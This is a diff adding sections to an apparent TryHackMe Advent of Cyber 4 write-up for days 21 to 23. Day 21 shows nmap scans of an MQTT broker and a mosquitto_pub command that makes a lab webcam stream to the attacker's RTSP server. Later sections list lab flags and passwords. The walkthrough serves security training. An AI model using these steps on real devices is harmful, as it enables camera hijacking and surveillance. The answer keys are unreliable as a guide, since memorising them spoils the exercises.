@@ -1147,7 +1147,7 @@ _Conversations_
 
 Then in the TCP sub-menu :
 
-![RDP](/images/thm/adventofcyber4/adventofcyber4_80b.png)
+![RDP](/images/thm/adventofcyber4/adventofcyber4_80c.png)
 _RDP_
 
 Answer : 3389
@@ -2100,12 +2100,530 @@ Answer : 2.6.31
 
 No Answer.
 
-
 ## TASK 26: [Day 21] MQTT Have yourself a merry little webcam 
-## TASK 27 : [Day 22] Attack Surface Reduction Threats are failing all around me 
-## TASK 28 : [Day 23] Defence in Depth Mission ELFPossible: Abominable for a Day 
+### What port is Mosquitto running on? 
+Mosquitto default port is 1883 :
+
+![Mosquitto port](/images/thm/adventofcyber4/adventofcyber4_133.png)
+_Mosquitto port_
+
+Let's try scanning it with nmap on our target to verify it is open :
 
 ```console
+root@ip-10-10-213-100:~# nmap -sC -vv 10.10.148.116 -p 1883
 
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-24 09:48 GMT
+NSE: Loaded 118 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:48
+Completed NSE at 09:48, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:48
+Completed NSE at 09:48, 0.00s elapsed
+Initiating ARP Ping Scan at 09:48
+Scanning 10.10.148.116 [1 port]
+Completed ARP Ping Scan at 09:48, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:48
+Completed Parallel DNS resolution of 1 host. at 09:48, 0.00s elapsed
+Initiating SYN Stealth Scan at 09:48
+Scanning ip-10-10-148-116.eu-west-1.compute.internal (10.10.148.116) [1 port]
+Discovered open port 1883/tcp on 10.10.148.116
+Completed SYN Stealth Scan at 09:48, 0.22s elapsed (1 total ports)
+NSE: Script scanning 10.10.148.116.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:48
+Completed NSE at 09:48, 0.01s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:48
+Completed NSE at 09:48, 0.00s elapsed
+Nmap scan report for ip-10-10-148-116.eu-west-1.compute.internal (10.10.148.116)
+Host is up, received arp-response (0.00024s latency).
+Scanned at 2022-12-24 09:48:29 GMT for 0s
+
+PORT     STATE SERVICE REASON
+1883/tcp open  mqtt    syn-ack ttl 64
+MAC Address: 02:3F:2A:72:88:ED (Unknown)
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:48
+Completed NSE at 09:48, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:48
+Completed NSE at 09:48, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
+           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
 ```
 {: .nolineno }
+
+Answer : 1883
+
+### Is the device/init topic enumerated by Nmap during a script scan of all ports? (y/n) 
+
+```console
+root@ip-10-10-213-100:~# nmap -sC -sV -p 1883 10.10.148.116 -vv
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-24 09:55 GMT
+NSE: Loaded 146 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:55
+Completed NSE at 09:55, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:55
+Completed NSE at 09:55, 0.00s elapsed
+Initiating ARP Ping Scan at 09:55
+Scanning 10.10.148.116 [1 port]
+Completed ARP Ping Scan at 09:55, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:55
+Completed Parallel DNS resolution of 1 host. at 09:55, 0.00s elapsed
+Initiating SYN Stealth Scan at 09:55
+Scanning ip-10-10-148-116.eu-west-1.compute.internal (10.10.148.116) [1 port]
+Discovered open port 1883/tcp on 10.10.148.116
+Completed SYN Stealth Scan at 09:55, 0.21s elapsed (1 total ports)
+Initiating Service scan at 09:55
+Scanning 1 service on ip-10-10-148-116.eu-west-1.compute.internal (10.10.148.116)
+Completed Service scan at 09:56, 6.01s elapsed (1 service on 1 host)
+NSE: Script scanning 10.10.148.116.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:56
+Completed NSE at 09:56, 5.39s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:56
+Completed NSE at 09:56, 0.00s elapsed
+Nmap scan report for ip-10-10-148-116.eu-west-1.compute.internal (10.10.148.116)
+Host is up, received arp-response (0.00016s latency).
+Scanned at 2022-12-24 09:55:55 GMT for 12s
+
+PORT     STATE SERVICE                 REASON         VERSION
+1883/tcp open  mosquitto version 1.6.9 syn-ack ttl 64
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|     $SYS/broker/load/bytes/received/15min: 169.28
+|     $SYS/broker/load/messages/received/15min: 7.12
+|     $SYS/broker/load/sockets/1min: 1.07
+|     $SYS/broker/publish/bytes/sent: 2896
+|     $SYS/broker/clients/connected: 4
+|     $SYS/broker/publish/messages/received: 127
+|     $SYS/broker/clients/inactive: 0
+|     $SYS/broker/uptime: 1287 seconds
+|     $SYS/broker/messages/sent: 273
+|     $SYS/broker/bytes/received: 4744
+|     $SYS/broker/load/messages/received/1min: 10.00
+|     $SYS/broker/load/bytes/received/1min: 227.06
+|     $SYS/broker/clients/disconnected: 0
+|     $SYS/broker/publish/bytes/received: 2540
+|     device/init: T8ECW2Z1I4QRGH2MQTMK
+|     $SYS/broker/store/messages/bytes: 203
+|     $SYS/broker/version: mosquitto version 1.6.9
+|     $SYS/broker/publish/messages/sent: 203
+|     $SYS/broker/messages/received: 198
+|     $SYS/broker/load/connections/5min: 0.27
+|     $SYS/broker/load/sockets/5min: 0.44
+|     $SYS/broker/load/bytes/sent/15min: 344.81
+|     $SYS/broker/load/sockets/15min: 0.23
+|     $SYS/broker/load/publish/sent/1min: 16.40
+|     $SYS/broker/load/publish/sent/5min: 16.13
+|     $SYS/broker/load/publish/received/1min: 6.08
+|     $SYS/broker/heap/current: 54952
+|     $SYS/broker/load/bytes/received/5min: 223.11
+|     $SYS/broker/load/publish/sent/15min: 8.98
+|     $SYS/broker/load/connections/1min: 0.16
+|     $SYS/broker/load/publish/received/5min: 5.94
+|     $SYS/broker/bytes/sent: 7693
+|     $SYS/broker/load/messages/sent/1min: 20.17
+|     $SYS/broker/clients/active: 4
+|     $SYS/broker/load/messages/sent/5min: 19.56
+|     $SYS/broker/load/messages/sent/15min: 11.51
+|     $SYS/broker/load/bytes/sent/5min: 629.50
+|     $SYS/broker/load/messages/received/5min: 9.50
+|     $SYS/broker/load/bytes/sent/1min: 639.72
+|_    $SYS/broker/load/publish/received/15min: 4.54
+MAC Address: 02:3F:2A:72:88:ED (Unknown)
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:56
+Completed NSE at 09:56, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:56
+Completed NSE at 09:56, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
+           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
+
+root@ip-10-10-213-100:~# nano test.txt
+root@ip-10-10-213-100:~# cat test.txt | grep "device/init"
+|     device/init: T8ECW2Z1I4QRGH2MQTMK
+root@ip-10-10-213-100:~# 
+```
+{: .nolineno }
+
+Answer : y
+
+### What Mosquitto version is the device using?
+From last nmap scan :
+
+```console
+PORT     STATE SERVICE                 REASON         VERSION
+1883/tcp open  mosquitto version 1.6.9 syn-ack ttl 64
+```
+{: .nolineno }
+
+Answer : 1.6.9
+
+### What flag is obtained from viewing the RTSP stream?
+
+Following the stesp :
+
+  1. Nmap scan discovered port 1883 as Mosquitto : ok
+
+  2. Nmap scan discovered device/init to obtain device ID : T8ECW2Z1I4QRGH2MQTMK
+
+  3. Start a [RTSP](https://github.com/aler9/rtsp-simple-server) : port 8554 !
+
+![RTSP](/images/thm/adventofcyber4/adventofcyber4_134.png)
+_RTSP_
+
+  4. Preparing data and useing mosquitto_pub to publish our payload to the device/id/cmd topic :
+
+```console
+Expected  behavior :
+{”CMD”:value,”URL”:"value"}
+[image]
+{”CMD”:10,”URL”:"rtsp://10.10.213.100:8554/djhqkjc"}
+```
+{: .nolineno }
+
+![mosquitto_pub](/images/thm/adventofcyber4/adventofcyber4_135.png)
+_mosquitto_pub_
+
+Then looked at mosquitto_pub's help :
+```console
+root@ip-10-10-213-100:~# mosquitto_pub --help
+mosquitto_pub is a simple mqtt client that will publish a message on a single topic and exit.
+mosquitto_pub version 1.4.15 running on libmosquitto 1.4.15.
+
+Usage: mosquitto_pub [-h host] [-k keepalive] [-p port] [-q qos] [-r] {-f file | -l | -n | -m message} -t topic
+                    [-A bind_address] [-S]
+                    [-i id] [-I id_prefix]
+                    [-d] [--quiet]
+                    [-M max_inflight]
+                    [-u username [-P password]]
+                    [--will-topic [--will-payload payload] [--will-qos qos] [--will-retain]]
+                    [{--cafile file | --capath dir} [--cert file] [--key file]
+                      [--ciphers ciphers] [--insecure]]
+                    [--psk hex-key --psk-identity identity [--ciphers ciphers]]
+                    [--proxy socks-url]
+      mosquitto_pub --help
+
+-A : bind the outgoing socket to this host/ip address. Use to control which interface
+      the client communicates over.
+-d : enable debug messages.
+-f : send the contents of a file as the message.
+-h : mqtt host to connect to. Defaults to localhost.
+-i : id to use for this client. Defaults to mosquitto_pub_ appended with the process id.
+-I : define the client id as id_prefix appended with the process id. Useful for when the
+      broker is using the clientid_prefixes option.
+-k : keep alive in seconds for this client. Defaults to 60.
+-l : read messages from stdin, sending a separate message for each line.
+-m : message payload to send.
+-M : the maximum inflight messages for QoS 1/2..
+-n : send a null (zero length) message.
+-p : network port to connect to. Defaults to 1883.
+-P : provide a password (requires MQTT 3.1 broker)
+-q : quality of service level to use for all messages. Defaults to 0.
+-r : message should be retained.
+-s : read message from stdin, sending the entire input as a message.
+-S : use SRV lookups to determine which host to connect to.
+-t : mqtt topic to publish to.
+-u : provide a username (requires MQTT 3.1 broker)
+-V : specify the version of the MQTT protocol to use when connecting.
+      Can be mqttv31 or mqttv311. Defaults to mqttv31.
+--help : display this message.
+--quiet : don't print error messages.
+--will-payload : payload for the client Will, which is sent by the broker in case of
+                  unexpected disconnection. If not given and will-topic is set, a zero
+                  length message will be sent.
+--will-qos : QoS level for the client Will.
+--will-retain : if given, make the client Will retained.
+--will-topic : the topic on which to publish the client Will.
+--cafile : path to a file containing trusted CA certificates to enable encrypted
+            communication.
+--capath : path to a directory containing trusted CA certificates to enable encrypted
+            communication.
+--cert : client certificate for authentication, if required by server.
+--key : client private key for authentication, if required by server.
+--ciphers : openssl compatible list of TLS ciphers to support.
+--tls-version : TLS protocol version, can be one of tlsv1.2 tlsv1.1 or tlsv1.
+                Defaults to tlsv1.2 if available.
+--insecure : do not check that the server certificate hostname matches the remote
+              hostname. Using this option means that you cannot be sure that the
+              remote host is the server you wish to connect to and so is insecure.
+              Do not use this option in a production environment.
+--psk : pre-shared-key in hexadecimal (no leading 0x) to enable TLS-PSK mode.
+--psk-identity : client identity string for TLS-PSK mode.
+--proxy : SOCKS5 proxy URL of the form:
+          socks5h://[username[:password]@]hostname[:port]
+          Only "none" and "username" authentication is supported.
+
+See http://mosquitto.org/ for more information.
+```
+{: .nolineno }
+
+We have 3 tags to set up : -h (host ip), -t (topic given with device ID found) and -m the message payload respecting the expected behavior !
+
+```console
+root@ip-10-10-213-100:~# mosquitto_pub -h 10.10.148.116 -t device/T8ECW2Z1I4QRGH2MQTMK/cmd -m """{"cmd":"10","url":"rtsp://10.10.213.100:8554/djhqkjc"}"""
+```
+{: .nolineno }
+
+Returning to our docker waiting listener, we got some communications :
+
+![mosquitto_pub](/images/thm/adventofcyber4/adventofcyber4_136.png)
+_mosquitto_pub_
+
+Now let's use VLC to view our camera stream :
+
+![mosquitto_pub](/images/thm/adventofcyber4/adventofcyber4_137.png)
+_mosquitto_pub_
+
+We get a stream connected to the camera !
+
+![Camera hacked](/images/thm/adventofcyber4/adventofcyber4_138.png)
+_Camera hacked_
+
+Answer : THM{UR_CAMERA_IS_MINE}
+
+If you want to learn more check out the Command Injection room or the Vulnerability Research module!
+
+No Answer.
+
+## TASK 27 : [Day 22] Attack Surface Reduction Threats are failing all around me 
+### Follow the instructions in the attached static site to help McSkidy reduce her attack surface against attacks from the Yeti. Use the flag as an answer to complete the task. 
+
+![Attack Surface](/images/thm/adventofcyber4/adventofcyber4_139.png)
+_Attack Surface_
+
+![Attack Surface](/images/thm/adventofcyber4/adventofcyber4_140.png)
+_Attack Surface_
+
+![Attack Surface](/images/thm/adventofcyber4/adventofcyber4_141.png)
+_Attack Surface_
+
+Answer : THM{4TT4CK SURF4C3 R3DUC3D}
+
+### If you'd like to study cyber defence more, why not start with the Threat and Vulnerability Management module?
+No Answer.
+
+## TASK 28 : [Day 23] Defence in Depth Mission ELFPossible: Abominable for a Day 
+### Case 1: What is the password for Santa’s Vault? 
+
+![Mission ELFPossible 1](/images/thm/adventofcyber4/adventofcyber4_142.png)
+_Mission ELFPossible 1_
+
+![Mission ELFPossible 2](/images/thm/adventofcyber4/adventofcyber4_143.png)
+_Mission ELFPossible 2_
+
+![Mission ELFPossible 3](/images/thm/adventofcyber4/adventofcyber4_144.png)
+_Mission ELFPossible 3_
+
+![Mission ELFPossible 4](/images/thm/adventofcyber4/adventofcyber4_145.png)
+_Mission ELFPossible 4_
+
+![Mission ELFPossible 5](/images/thm/adventofcyber4/adventofcyber4_146.png)
+_Mission ELFPossible 5_
+
+![Mission ELFPossible 6](/images/thm/adventofcyber4/adventofcyber4_147.png)
+_Mission ELFPossible 6_
+
+![Mission ELFPossible 7](/images/thm/adventofcyber4/adventofcyber4_148.png)
+_Mission ELFPossible 7_
+
+Santa'S Vault password is written on a paper next to his ID card !
+
+Answer : S3cr3tV@ultPW
+
+### Case 1: What is the Flag?
+
+We can now return to Santa's office :
+
+![Mission ELFPossible 8](/images/thm/adventofcyber4/adventofcyber4_149.png)
+_Mission ELFPossible 8_
+
+![Mission ELFPossible 9](/images/thm/adventofcyber4/adventofcyber4_150.png)
+_Mission ELFPossible 9_
+
+![Mission ELFPossible 10](/images/thm/adventofcyber4/adventofcyber4_151.png)
+_Mission ELFPossible 10_
+
+![Mission ELFPossible 11](/images/thm/adventofcyber4/adventofcyber4_152.png)
+_Mission ELFPossible 11_
+
+![Mission ELFPossible 12](/images/thm/adventofcyber4/adventofcyber4_153.png)
+_Mission ELFPossible 12_
+
+![Mission ELFPossible 13](/images/thm/adventofcyber4/adventofcyber4_154.png)
+_Mission ELFPossible 13_
+
+Answer : THM{EZ_fl@6!}
+
+### Case 2: What is Santa’s favourite thing?
+
+![Mission ELFPossible 14](/images/thm/adventofcyber4/adventofcyber4_155.png)
+_Mission ELFPossible 14_
+
+![Mission ELFPossible 15](/images/thm/adventofcyber4/adventofcyber4_156.png)
+_Mission ELFPossible 15_
+
+![Mission ELFPossible 16](/images/thm/adventofcyber4/adventofcyber4_157.png)
+_Mission ELFPossible 16_
+
+![Mission ELFPossible 17](/images/thm/adventofcyber4/adventofcyber4_158.png)
+_Mission ELFPossible 17_
+
+Answer : MilkAndCookies
+
+### Case 2: What is the password for Santa’s Vault?
+
+![Mission ELFPossible 18](/images/thm/adventofcyber4/adventofcyber4_159.png)
+_Mission ELFPossible 18_
+
+![Mission ELFPossible 19](/images/thm/adventofcyber4/adventofcyber4_160.png)
+_Mission ELFPossible 19_
+
+![Mission ELFPossible 20](/images/thm/adventofcyber4/adventofcyber4_161.png)
+_Mission ELFPossible 20_
+
+![Mission ELFPossible 21](/images/thm/adventofcyber4/adventofcyber4_162.png)
+_Mission ELFPossible 21_
+
+![Mission ELFPossible 22](/images/thm/adventofcyber4/adventofcyber4_163.png)
+_Mission ELFPossible 22_
+
+![Mission ELFPossible 23](/images/thm/adventofcyber4/adventofcyber4_164.png)
+_Mission ELFPossible 23_
+
+Answer : 3XtrR@_S3cr3tV@ultPW
+
+#### Case 2: What is the Flag?
+
+Now we got the vault password, we can steal Santa's list :
+
+![Mission ELFPossible 24](/images/thm/adventofcyber4/adventofcyber4_165.png)
+_Mission ELFPossible 24_
+
+![Mission ELFPossible 25](/images/thm/adventofcyber4/adventofcyber4_166.png)
+_Mission ELFPossible 25_
+
+![Mission ELFPossible 26](/images/thm/adventofcyber4/adventofcyber4_167.png)
+_Mission ELFPossible 26_
+
+Answer : THM{m0@r_5t3pS_n0w!}
+
+### Case 3: What is the Executive Assistant’s favourite thing?
+
+![Mission ELFPossible 27](/images/thm/adventofcyber4/adventofcyber4_168.png)
+_Mission ELFPossible 27_
+
+![Mission ELFPossible 28](/images/thm/adventofcyber4/adventofcyber4_169.png)
+_Mission ELFPossible 28_
+
+![Mission ELFPossible 29](/images/thm/adventofcyber4/adventofcyber4_170.png)
+_Mission ELFPossible 29_
+
+Answer : BanoffeePie
+
+### Case 3: What is Santa’s previous password?
+
+![Mission ELFPossible 30](/images/thm/adventofcyber4/adventofcyber4_171.png)
+_Mission ELFPossible 30_
+
+![Mission ELFPossible 31](/images/thm/adventofcyber4/adventofcyber4_172.png)
+_Mission ELFPossible 31_
+
+![Mission ELFPossible 32](/images/thm/adventofcyber4/adventofcyber4_173.png)
+_Mission ELFPossible 32_
+
+![Mission ELFPossible 33](/images/thm/adventofcyber4/adventofcyber4_174.png)
+_Mission ELFPossible 33_
+
+![Mission ELFPossible 34](/images/thm/adventofcyber4/adventofcyber4_175.png)
+_Mission ELFPossible 34_
+
+![Mission ELFPossible 35](/images/thm/adventofcyber4/adventofcyber4_176.png)
+_Mission ELFPossible 35_
+
+![Mission ELFPossible 36](/images/thm/adventofcyber4/adventofcyber4_177.png)
+_Mission ELFPossible 36_
+
+![Mission ELFPossible 37](/images/thm/adventofcyber4/adventofcyber4_178.png)
+_Mission ELFPossible 37_
+
+![Mission ELFPossible 38](/images/thm/adventofcyber4/adventofcyber4_179.png)
+_Mission ELFPossible 38_
+
+Answer : H0tCh0coL@t3_01
+
+### Case 3: What is Santa’s current password?
+
+Trying to change numbers at the end of last password as hint says Santa is reusing passwords !
+
+Answer : H0tCh0coL@t3_02
+
+### Case 3: What is the 1st part of the vault’s password?
+
+![Mission ELFPossible 39](/images/thm/adventofcyber4/adventofcyber4_180.png)
+_Mission ELFPossible 39_
+
+Answer : N3w4nd1m
+
+### Case 3: What is the 2nd part of the vault’s password?
+
+![Mission ELFPossible 40](/images/thm/adventofcyber4/adventofcyber4_181.png)
+_Mission ELFPossible 40_
+
+![Mission ELFPossible 41](/images/thm/adventofcyber4/adventofcyber4_182.png)
+_Mission ELFPossible 41_
+
+Answer : Pr0v3dV@ultPW
+
+### Case 3: What is the password for Santa’s Vault?
+
+Answer : N3w4nd1mPr0v3dV@ultPW
+
+### Case 3: What is the Flag?
+
+![Mission ELFPossible 42](/images/thm/adventofcyber4/adventofcyber4_183.png)
+_Mission ELFPossible 42_
+
+![Mission ELFPossible 43](/images/thm/adventofcyber4/adventofcyber4_184.png)
+_Mission ELFPossible 43_
+
+Answer : THM{B@d_Y3t1_1s_n@u6hty}
+
+### What is Santa's Code?
+
+Answer : 2845
+
+### Mission ELFPossible: What is the Abominable for a Day Flag?
+
+![Mission ELFPossible 44](/images/thm/adventofcyber4/adventofcyber4_185.png)
+_Mission ELFPossible 44_
+
+![Mission ELFPossible 45](/images/thm/adventofcyber4/adventofcyber4_186.png)
+_Mission ELFPossible 45_
+
+Then opening the door :
+
+![Mission ELFPossible 46](/images/thm/adventofcyber4/adventofcyber4_187.png)
+_Mission ELFPossible 46_
+
+Answer : THM{D3f3n5e_1n_D3pth_1s_k00L!!}
+
+### If you'd like to learn more about mitigating and managing potential adversary actions, check out the Threat Intelligence module!
+
+No Answer.
